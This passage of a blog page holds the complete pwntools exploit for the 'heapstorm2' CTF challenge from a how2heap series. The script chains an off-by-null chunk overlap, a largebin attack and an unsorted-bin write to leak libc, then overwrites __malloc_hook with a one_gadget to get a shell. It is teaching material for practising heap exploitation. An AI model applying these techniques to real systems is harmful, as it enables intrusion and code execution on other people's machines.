class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./heapstorm2'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">	log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''libc 2.23 x64</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL</span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="string">fastbin addree to size： (offset_to_fastbinY/8+2)&lt;&lt;(4 or 3)</span></span><br><span class="line"><span class="string">largebin chunksize:0x410|0x450|0x490|0x4C0...</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x18</span>)<span class="comment">#0 for off_by_null</span></span><br><span class="line">alloc(<span class="number">0xC30</span>)<span class="comment">#1 for split</span></span><br><span class="line">alloc(<span class="number">0x18</span>)<span class="comment">#2 for merge</span></span><br><span class="line">alloc(<span class="number">0x18</span>)<span class="comment">#3 guard</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'\x33'</span>*<span class="number">0xBF0</span>+p64(<span class="number">0xC00</span>)<span class="comment">#set fake prev_size</span></span><br><span class="line">update(<span class="number">1</span>,len(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#(0,,2,3)</span></span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x18</span><span class="number">-0xc</span>,<span class="string">'a'</span>*(<span class="number">0x18</span><span class="number">-0xc</span>))<span class="comment">#off_bu_null 0xC40-&gt;0xC00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#split 1 now</span></span><br><span class="line">alloc(<span class="number">0xf0</span>)<span class="comment">#1 0x100 chunk</span></span><br><span class="line">alloc(<span class="number">0x400</span>)<span class="comment">#4 0x410 chunk large</span></span><br><span class="line">alloc(<span class="number">0x1f0</span>)<span class="comment">#5 0x200 chunk</span></span><br><span class="line">alloc(<span class="number">0x410</span>)<span class="comment">#6 0x420 chunk large</span></span><br><span class="line"><span class="comment">#1 remain:0x131</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#(0,,2,3,4,5,6) for unlink</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#(0,,,3,4,5,6) merge&amp;overlap</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0xC50</span>)<span class="comment">#1   now chunk 1 overlap (4,5,6,remain)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#recover 0x410chunk's size &amp; other chunk's size because of calloc--↓</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xf0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x201</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x1f0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x410</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x131</span>)</span><br><span class="line">update(<span class="number">1</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#------------------------------------------------------------------↑</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#alloc(0x410)#2 !!!!!!!need a overlap chunk for victim do not alloc one like me before</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)<span class="comment">#(0,1,,3,,5,6) overlapped chunk 4 to ub</span></span><br><span class="line">alloc(<span class="number">0x430</span>)<span class="comment">#2 set chunk 4 to largebin&amp;remain to smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite chunk 4 ------------------------↓</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xf0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x133707c3</span><span class="number">-0x10</span>)<span class="comment">#mmap region above the random area</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x133707d8</span><span class="number">-0x20</span>)</span><br><span class="line">update(<span class="number">1</span>,len(payload),payload)<span class="comment">#set for largebin attack</span></span><br><span class="line"><span class="comment">#------------------------------------------↑</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)<span class="comment">#(0,1,2,3,,5) 0x420chunk to ub</span></span><br><span class="line">alloc(<span class="number">0x440</span>)<span class="comment">#4             0x420 chunk to largebin(largebin attack)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#reset 0x200&amp;0x130 chunk's prev_inuse---------↓</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xf0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x133707c3</span><span class="number">-0x10</span>)<span class="comment">#No other meanings,just ctrl+c ctrl+v</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x133707d8</span><span class="number">-0x20</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x3e0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x201</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x1f0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x410</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x131</span>)</span><br><span class="line">update(<span class="number">1</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#---------------------------------------------↑</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'brva 0x113c')</span></span><br><span class="line">delete(<span class="number">5</span>)<span class="comment">#(0,1,2,3,4)#set 0x200 chunk to ub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#reset 0x200 chunk's bk-----------------------↓</span></span><br><span class="line">fake_chunk=<span class="number">0x133707c0</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xf0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x133707c3</span><span class="number">-0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x133707d8</span><span class="number">-0x20</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x3e0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x201</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(fake_chunk)</span><br><span class="line">update(<span class="number">1</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#---------------------------------------------↑</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x1f0</span>)<span class="comment">#5 after this we can alloc the first 0x5? chunk</span></span><br><span class="line">			<span class="comment">#an we need to pass the the chunk_is_mmapped check in _libc_malloc randomly XD</span></span><br><span class="line">loginfo()</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x40</span>)<span class="comment">#6 get first mmap region chunk out</span></span><br><span class="line">update(<span class="number">6</span>,<span class="number">0x18</span>,p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x133707b0</span>))</span><br><span class="line"><span class="comment">#set another fake size&amp;bk,and bk is used for writing libc address:(bck-&gt;fd = unsorted_chunks (av))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#reset 0x420 chunk's bk again----------------↓</span></span><br><span class="line"><span class="comment">#because we write the 0x420chunk's address(vicitm) on the bk of 0x5? chunk</span></span><br><span class="line"><span class="comment">#after we malloc out the 0x5? chunk,the 0x420 chunk back to unsortedbin again</span></span><br><span class="line"><span class="comment">#we can control the chunk's bk for malloc out the random_area next time</span></span><br><span class="line">fake_chunk=<span class="number">0x133707c8</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xf0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x201</span>)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x1f0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(fake_chunk)</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x131</span>)</span><br><span class="line">update(<span class="number">1</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#--------------------------------------------↑</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#We can allocate a 0x100 chunk at the random_area! Play our leak&amp;write game now!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">alloc(<span class="number">0x410</span>)<span class="comment">#7</span></span><br><span class="line">alloc(<span class="number">0xf0</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Write the libaddress location&amp;view key at index 0----↓</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)+p64(<span class="number">0x13377331</span>)</span><br><span class="line">payload+=p64(<span class="number">0x133707c0</span>)+p64(<span class="number">8</span>)</span><br><span class="line">update(<span class="number">8</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#-----------------------------------------------------↑</span></span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Chunk[0]: '</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">8</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">loginfo(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#__malloc_hook to index 0---------------------↓</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)+p64(<span class="number">0x13377331</span>)</span><br><span class="line">payload+=p64(<span class="number">0x3c4b10</span>+libc_base)+p64(<span class="number">8</span>+<span class="number">0xc</span>)</span><br><span class="line">update(<span class="number">8</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#---------------------------------------------↑</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">0</span>,<span class="number">8</span>,p64(<span class="number">0x4526a</span>+libc_base))</span><br><span class="line">alloc(<span class="number">0x666</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/26/how2heap-unsorted-bin-zerostorage/" rel="prev" title="how2heap - unsorted_bin&zerostorage">
+      <i class="fa fa-chevron-left"></i> how2heap - unsorted_bin&zerostorage
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#how2heap-large-bin-attack-amp-heapstorm2"><span class="nav-number">1.</span> <span class="nav-text">how2heap - large_bin_attack&amp;heapstorm2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#large-bin-attack-c"><span class="nav-number">2.</span> <span class="nav-text">large_bin_attack.c</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#heapstorm2"><span class="nav-number">3.</span> <span class="nav-text">heapstorm2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">3.1.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#init"><span class="nav-number">3.1.1.</span> <span class="nav-text">init</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#alloc"><span class="nav-number">3.1.2.</span> <span class="nav-text">alloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update"><span class="nav-number">3.1.3.</span> <span class="nav-text">update</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delete"><span class="nav-number">3.1.4.</span> <span class="nav-text">delete</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#view"><span class="nav-number">3.1.5.</span> <span class="nav-text">view</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析-amp-exploit"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞分析&amp;exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整EXP"><span class="nav-number">3.3.</span> <span class="nav-text">完整EXP</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
